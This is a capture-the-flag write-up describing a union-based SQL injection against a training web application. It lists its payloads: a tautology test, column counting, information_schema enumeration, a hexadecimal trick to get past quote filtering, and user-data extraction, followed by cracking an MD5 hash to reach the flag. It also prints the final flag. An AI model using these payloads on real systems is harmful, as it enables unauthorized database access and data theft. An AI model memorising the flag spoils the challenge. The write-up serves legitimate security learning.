
# 🧩 Challenge Resolution

## 🎯 Objective
Exploit an SQL Injection vulnerability on a web application to retrieve the hidden **flag**.

---

## 💡 Challenges Faced

- The web app was **sensitive to special characters** (such as `'` and `%`), causing many typical payloads to fail.
- To bypass this limitation, I had to use **hexadecimal encoding** for certain inputs.
- I also had to **manually enumerate the table names and column names** to fully understand the database structure.

---

## 🧑‍💻 Step-by-Step Exploitation
![Capture d’écran 2025-04-18 à 17 58 30](https://github.com/user-attachments/assets/1222c90e-0efa-4a0f-be00-56112fe0170d)


---

### 1️⃣ Basic Injection — Discovering the Users List

**Payload used:**
```
1 OR 1=1
```

👉 **Goal:**  
Test whether the input field is vulnerable to SQL Injection.

✅ **Result:**  

![Capture d’écran 2025-04-18 à 18 17 49](https://github.com/user-attachments/assets/f690f187-a793-46f7-9330-1dd4c67deaec)


The application returned the **entire list of users**.  
This is when I first spotted a user called:

> **GetThe Flag**.

This user was the **fifth entry** in the list, which clearly hinted at its link to the challenge's flag — although the data returned wasn't complete, only a part of the flag was visible.

---

### 2️⃣ Understanding the Structure: Finding the Number of Columns

**Payloads used:**
```
1 ORDER BY 1    → Valid  
1 ORDER BY 2    → Valid  
1 ORDER BY 3    → Error
```

👉 **Goal:**  
Identify the number of columns used in the query.

✅ **Result:**  
The error on `ORDER BY 3` confirmed that the query was dealing with exactly **2 columns**.

This was a critical step to crafting the correct `UNION SELECT` statements later on.

---

### 3️⃣ Table Enumeration: Finding the Table Name

**Payload used:**
```
1 UNION SELECT table_name, null FROM information_schema.tables
```

👉 **Goal:**  
List all the tables present in the database.

✅ **Result:**  

![Capture d’écran 2025-04-18 à 18 20 04](https://github.com/user-attachments/assets/e6e93f61-5536-49e0-8ed8-7af8d8c60af5)


Among the results, one table stood out:  
**users**.

This table name strongly suggested it stored user-related data, so I logically assumed the flag had to be linked to this table.

---

### 4️⃣ Bypassing Quote Restrictions: Hexadecimal Trick

Since using quotes (`'users'`) caused errors due to special character filtering, I bypassed it by converting the string into **hexadecimal**.

```
'users' → 0x7573657273
```

**Payload used:**
```
1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x7573657273 -- 
```

✅ **Result:**  

![Capture d’écran 2025-04-18 à 18 21 05](https://github.com/user-attachments/assets/85d6f4b3-89a5-4bea-96bb-d3b13d178a0e)


This allowed me to list **all columns** of the `users` table, fully bypassing the character restriction.

---

### 5️⃣ Data Extraction: Retrieving Table Content

Once the column names were known, I extracted the values, always combining two fields (since I had confirmed the table only had two columns).

**Payload used:**
```
1 UNION SELECT first_name, last_name FROM users
```

✅ **Result:** 

![Capture d’écran 2025-04-18 à 18 22 39](https://github.com/user-attachments/assets/86e0f3b6-1b60-41d7-b72b-86c13c582b1b)


This step revealed the actual user data.  
That confirmed I was on the right track!

---

### 6️⃣ The Key Discovery: Flag Location

The final breakthrough came when I focused on the last two columns of the `users` table.

**Payload used:**
```
1 UNION SELECT Commentaire, countersign FROM users
```

✅ **Result:**

![Capture d’écran 2025-04-18 à 18 24 09](https://github.com/user-attachments/assets/5f604a82-123e-426f-877c-4f3b17ef3ec6)

```
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good!
Surname : 5ff9d0165b4f92b14994e5c685cdce28
```

This message indicated the real flag was hidden in a hash.

---

## 🔐 Final Step: Hash Decoding

- The **MD5 hash** `5ff9d0165b4f92b14994e5c685cdce28` decrypts to: `FortyTwo`. (with : https://md5decrypt.net/)

![Capture d’écran 2025-04-18 à 18 25 37](https://github.com/user-attachments/assets/f9435113-0979-4baf-a71d-dd2f46238852)

- The instruction said: **"lower all the char"** → `FortyTwo` becomes `fortytwo`.
- Finally, I computed the **SHA-256 hash** of `fortytwo` to reveal the **final flag** (with : https://emn178.github.io/online-tools/sha256.html):

![Capture d’écran 2025-04-18 à 18 26 21](https://github.com/user-attachments/assets/3555863c-909c-4195-96f6-2a2e220b2d74)

```
b8aefde4f2355020ec2d42cf4d3e067c18e5fcfc727b627f0daee7be7c0e6f5e
```

---

## 🏁 Conclusion

This challenge was a great example of a **classic SQL Injection** scenario, but with a few smart twists:
- Quote and special character filtering.
- The need to switch to **hexadecimal** to extract table and column names.
- Using logical deduction to focus on the `users` table.
- Finally combining cryptographic reasoning with practical SQL enumeration.

The moment I spotted **GetTheFlag** was the clear turning point — but extracting the final `Commentaire` and `countersign` fields was what sealed the win!
